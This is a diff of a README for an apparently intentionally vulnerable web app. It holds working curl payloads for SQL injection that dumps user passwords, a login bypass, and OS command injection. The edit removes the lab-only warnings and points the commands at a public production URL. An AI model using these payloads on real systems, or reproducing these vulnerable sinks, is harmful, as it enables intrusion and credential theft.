@@ -1,14 +1,19 @@
-# Galactic Bestiary — Instructor / Student Cheatsheet
+# Galactic Bestiary — Reference
 
-**For authorized security education only.** Run this app locally in a VM or isolated lab. Do not deploy to the public internet.
+## Deployment
 
-This document describes how the **intentional** flaws in this project can be exercised. Use it to teach impact, detection, and remediation—not to attack systems you do not own.
+| Environment | Base URL |
+|-------------|----------|
+| **Production** | [https://main.d3ompulu8lf7wb.amplifyapp.com/](https://main.d3ompulu8lf7wb.amplifyapp.com/) |
+| **Local** | [http://localhost:3000](http://localhost:3000) (`npm run dev`) |
+
+Use `$BASE` in the examples below (e.g. `export BASE=https://main.d3ompulu8lf7wb.amplifyapp.com` or `export BASE=http://localhost:3000`).
 
 ---
 
-## Lab map
+## Application map
 
-| Surface | UI location | HTTP | Vulnerable code |
+| Surface | UI location | HTTP | Route handler |
 |---------|-------------|------|-----------------|
 | SQL injection | **Search portal** | `GET /api/search?q=…` | String-built `LIKE` in [`app/api/search/route.ts`](app/api/search/route.ts) |
 | Login SQLi (auth bypass) | **Archive console** login | `POST /api/admin/login` JSON `{ "username", "password" }` | String-built `WHERE` in [`app/api/admin/login/route.ts`](app/api/admin/login/route.ts) |
@@ -76,13 +81,13 @@ SQLite treats `--` as a comment, so the trailing `%'` never breaks the query.
 **1. Recon (benign)**
 
 ```bash
-curl -s "http://localhost:3000/api/search?q=Vorash" | jq '.rows | length'
+curl -s "$BASE/api/search?q=Vorash" | jq '.rows | length'
 # → 1
 
-curl -s "http://localhost:3000/api/search?q=%25" | jq '.rows | length'   # %25 = %
+curl -s "$BASE/api/search?q=%25" | jq '.rows | length'   # %25 = %
 # → 9
 
-curl -s "http://localhost:3000/api/search?q=%27" | jq '.sqlError'        # %27 = '
+curl -s "$BASE/api/search?q=%27" | jq '.sqlError'        # %27 = '
 # → non-null error message
 ```
 
@@ -117,7 +122,7 @@ curl -s "http://localhost:3000/api/search?q=%27" | jq '.sqlError'        # %27 =
 **curl:**
 
 ```bash
-curl -s --get "http://localhost:3000/api/search" \
+curl -s --get "$BASE/api/search" \
   --data-urlencode "q=' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--" \
   | jq '.rows[] | {name, species, home_planet}'
 ```
@@ -204,13 +209,13 @@ Admin APIs use **parameterized** SQL; the lesson is **authentication** failure, 
 
 ```bash
 # Bypass as archivist
-curl -s -X POST http://localhost:3000/api/admin/login \
+curl -s -X POST "$BASE/api/admin/login" \
   -H "Content-Type: application/json" \
   -d '{"username":"archivist'\''--","password":"wrong"}' \
   -c /tmp/admin-cookies.txt | jq
 
 # Use session cookie
-curl -s http://localhost:3000/api/admin/users -b /tmp/admin-cookies.txt | jq
+curl -s "$BASE/api/admin/users" -b /tmp/admin-cookies.txt | jq
 ```
 
 ### Remediation talking points
@@ -272,7 +277,7 @@ In production, the same bug often leads to reverse shells, credential theft, or 
 **1. Baseline (benign)**
 
 ```bash
-curl -s -X POST http://localhost:3000/api/ping \
+curl -s -X POST "$BASE/api/ping" \
   -H "Content-Type: application/json" \
   -d '{"target":"127.0.0.1"}' | jq -r '.stdout'
 ```
@@ -282,7 +287,7 @@ curl -s -X POST http://localhost:3000/api/ping \
 **2. Prove command chaining**
 
 ```bash
-curl -s -X POST http://localhost:3000/api/ping \
+curl -s -X POST "$BASE/api/ping" \
   -H "Content-Type: application/json" \
   -d '{"target":"127.0.0.1; whoami"}' | jq -r '.stdout, .stderr'
 ```
@@ -298,7 +303,7 @@ Students see **ping output and their username** in the same box—proof the serv
 **3. Read app data from disk**
 
 ```bash
-curl -s -X POST http://localhost:3000/api/ping \
+curl -s -X POST "$BASE/api/ping" \
   -H "Content-Type: application/json" \
   -d '{"target":"127.0.0.1; cat data/galactic.db | xxd | head -5"}' | jq -r '.stdout'
 ```
@@ -307,7 +312,7 @@ curl -s -X POST http://localhost:3000/api/ping \
 
 **4. Discuss impact**
 
-The sidebar was labeled “connectivity check,” but the backend is a **remote shell** with training wheels. In AWS/Lambda hosting this would be catastrophic; locally it demonstrates why `exec` + user input is forbidden.
+The sidebar is labeled “connectivity check,” but the backend invokes a shell to run `ping`. On serverless hosting (e.g. Amplify) behavior may differ from a local Node process; treat unsanitized `exec` + user input as high risk in review.
 
 ### Windows labs
 
@@ -322,15 +327,15 @@ Default code uses `ping -c 4` (Linux/macOS). On Windows, change the route to `pi
 
 ---
 
-## 4. What is *not* vulnerable here
+## 4. Other endpoints
 
-- **`GET /api/creatures`** — prepared statement, safe listing for the grid/chart.
-- **`/api/admin/creatures` and `/api/admin/users`** (after login) — parameterized queries; protected by session cookie only.
-- **Frontend** — React escaping reduces XSS from reflected search results; focus the lab on **server-side** SQL and OS command issues.
+- **`GET /api/creatures`** — prepared statement listing for the grid/chart.
+- **`/api/admin/creatures` and `/api/admin/users`** (after login) — parameterized queries; protected by session cookie.
+- **Frontend** — React escaping reduces XSS from reflected search results; server-side review should still cover SQL and OS command handling.
 
 ---
 
-## 5. Suggested lab flow (45–60 min)
+## 5. Suggested walkthrough (45–60 min)
 
 1. **Explore** the UI; confirm 9 seeded creatures and quadrant chart.
 2. **SQLi** — `%` → all; `' OR 1=1--` → all; discuss `sqlError` on malformed input.
@@ -375,7 +380,7 @@ Default code uses `ping -c 4` (Linux/macOS). On Windows, change the route to `pi
 
 ## 7. Opengrep / SAST
 
-Vulnerable code uses **textbook sinks** (inline template literals):
+Notable sinks (inline template literals):
 
 - SQL search: `db.prepare(\`SELECT ... '${q}'\`)` in [`app/api/search/route.ts`](app/api/search/route.ts)
 - SQL login: `db.prepare(\`SELECT ... '${username}' ... '${password}'\`)` in [`app/api/admin/login/route.ts`](app/api/admin/login/route.ts)
@@ -383,13 +388,13 @@ Vulnerable code uses **textbook sinks** (inline template literals):
 
 **Scan results (typical):**
 
-| Command | Lab API findings |
+| Command | API findings |
 |---------|------------------|
 | `npm run scan:security` (`.opengrep/galactic-lab.yaml`) | **4–5** (search SQLi + login SQLi + CMDi) |
 | `npm run scan:community` (cloned semgrep-rules subset) | **0** (Express/Lambda/mysql sinks) |
 | `opengrep scan --config auto app/api/` | **0** (registry rules still miss Next.js + `better-sqlite3`) |
 
-Students should use **custom lab rules** plus manual review; cloned community packs remain a **false-negative** demo.
+Use **custom rules** in `.opengrep/galactic-lab.yaml` plus manual review; cloned community packs often report **no** findings on this stack.
 
 ```bash
 npm run scan:security
